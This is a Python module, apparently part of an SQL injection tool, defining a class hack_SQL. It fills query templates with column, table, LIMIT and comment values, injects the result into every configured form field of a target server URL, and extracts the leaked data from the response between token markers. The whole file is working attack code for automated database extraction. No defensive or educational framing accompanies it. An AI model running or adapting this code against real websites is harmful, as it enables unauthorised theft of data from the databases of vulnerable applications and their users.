from ..algorithm.app import App
import requests
import sys
import re

class hack_SQL(App):
    def __init__(self, obj):
        self.OBJ = obj['obj']
        self.SQL = obj['sql']
        self.TOKEN = self.OBJ['app_token']

    def mysqli(self, column, table, row = 1):
        try:
            queries = self.getJSON(self.OBJ['dir_queryinject'])
            query = queries[ self.SQL['sqlinjectpos'] ]
            column = self.hackColumn([column], self.TOKEN, self.SQL['sep'])+self.SQL['sidecolumn']
            query = re.sub(r'(<%COLUMN%>)', column, query)
            query = re.sub(r'(<%TABLE%>)', table, query)
            LIMIT = self.SQL['limit'].replace('<%X%>', str(row-1)).replace('<%Y%>', str(1))
            query = re.sub(r'(<%LIMIT%>)', LIMIT, query)
            query = re.sub(r'(<%COMMENT%>)', self.SQL['comment'], query)
            
            obj = {}
            for attr in self.SQL['field']:
                obj.update({ attr : query })

            r = self.sendRequest(self.SQL['serverurl'], obj, self.SQL['method'])
            r = r.split(self.TOKEN)[1].split(self.TOKEN)[0]
        except:
            r = ''
        return r